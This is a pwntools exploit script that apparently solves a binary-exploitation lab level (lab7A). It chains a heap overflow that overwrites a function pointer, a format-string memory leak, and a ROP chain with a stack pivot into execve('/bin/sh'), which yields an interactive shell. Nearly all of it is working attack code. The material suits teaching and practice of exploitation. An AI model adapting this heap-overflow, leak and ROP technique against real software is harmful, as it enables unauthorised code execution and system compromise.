from pwn import * 
import time 

#p = remote("127.0.0.1",7741)
p = process("/levels/lab07/lab7A") 
pause() 
# Global things to be defined 
printf = 0x08050260

def initial_overwrite():

    # Create the initial object to setup the heap overflow
    p.sendline('1') 
    p.sendline('131') 
    p.sendline('A' * 130)
    
    # Create a second object, which we will corrupt
    p.sendline('1') 
    p.sendline('128') 
    p.sendline('B' * 128) 
    
    # Edit the first object
    p.sendline('2') 
    p.sendline('0') 
    
    # The overflow string 
    # 128 characters because of the message block. 4 is for the next integer. 8 is for the heap metadata (I think?). The last value is the address that is being overwritten 

    # This will overwrite a print function for later use in the exploit
    overwrite = "C" * 128 + "D" * 4 + "E" * 8 + p32(0x08049481)
    p.sendline(overwrite)

def memory_leak():

    # Create the initial object to setup the heap overflow for printf
    # Item 3
    p.sendline('1') 
    p.sendline('131') 
    p.sendline('A' * 130)
    
    # Create a fourth object, which we will corrupt
    p.sendline('1') 
    p.sendline('128') 
    p.sendline('B' * 128) 
    
    # Edit the third object
    p.sendline('2') 
    p.sendline('2') 
    
    # The overflow string 
    # 128 characters because of the message block. 4 is for the next integer. 8 is for the heap metadata (I think?). The last value is the address of printf (to leak values from the heap)
    overwrite = "C" * 128 + "D" * 4 + "E" * 8 + p32(printf) + "AAAA%20$pAAAA"

    # Trigger the printf function
    p.sendline(overwrite)
    p.sendline('4') 
    p.sendline('1')
    p.sendline('3')

    # In/out to leak the proper data
    p.recv() 
    p.sendline('1')
    p.sendline('?') 
    p.recvuntil('Input message index to print:') 
    p.recvuntil('AAAA') 
    leak = p.recv() 
    leak = int(leak[0:9],16)
    print "Memory leak...", leak
    return leak

# Creates the necessary rop chain :)
def get_ROP_chain(leak): 
    ROP_chain = ''
    # Sets the function pointer of the first jump
    # This first jump is to a stack pivot that points us to another location on the stack (that is ecx) that is controllable
    ROP_chain += p32(0x080bd486)
    # Clear ecx 
    ROP_chain += p32(0x080e76ad) 
    ROP_chain += p32(0x0) 
    
    # Clear edx 
    # Had to use this gadget, because of the previous newlewline...
    # Has to be done before setting ebx
    ROP_chain += p32(0x08070309) 
    ROP_chain += "JUNK"
    ROP_chain += p32(0x0) 

    # Put eax into eax
    ROP_chain += p32(0x080bd226)
    ROP_chain += p32(0xb) 
    
    # Put pointer to /bin/sh into ebx 
    ROP_chain += p32(0x080481c9) 
    ROP_chain += p32(leak + 0x2c)
    
    # Jump to the syscall 
    ROP_chain += p32(0x08048ef6) 
    ROP_chain += "/bin/sh\x00"
    return ROP_chain

# The third step in the exploit process
def write_ROP(leak):

    # Edit the first object in order to create a ROP chain
    p.sendline('2') 
    p.sendline('0') 
    
    # The overflow string 
    # 128 characters because of the message block. 4 is for the next integer. 8 is for the heap metadata (I think?). The last value is the address that is being overwritten 

    # Get the ROP payload
    ROP = get_ROP_chain(leak)
    # This will overwrite a print function for later use in the exploit
    overwrite = "C" * 128 + "D" * 4 + "E" * 8 + ROP
    p.sendline(overwrite)

# This function calls the ROP chain via the inserted function pointer in the 2nd object
def finish_payload(leak):
    p.sendline('4') 

    # The first part of the ROP chain...
    # This resets the strack value into a controllable location with the first ROP. 
    # Then, we jump to a different gadget in order to move the stack register to the heap
    p.sendline('1' + p32(0x080bd1d6) + p32(leak +4))
  
initial_overwrite() 
leak = memory_leak() 
write_ROP(leak)
finish_payload(leak)
p.interactive() 
